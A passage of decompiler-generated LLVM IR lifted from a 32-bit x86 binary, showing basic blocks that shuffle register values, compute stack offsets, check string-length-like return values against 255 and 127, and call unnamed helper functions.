dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8055494.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8052950()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80184, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp150, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb208, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp151, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp152 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp152, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
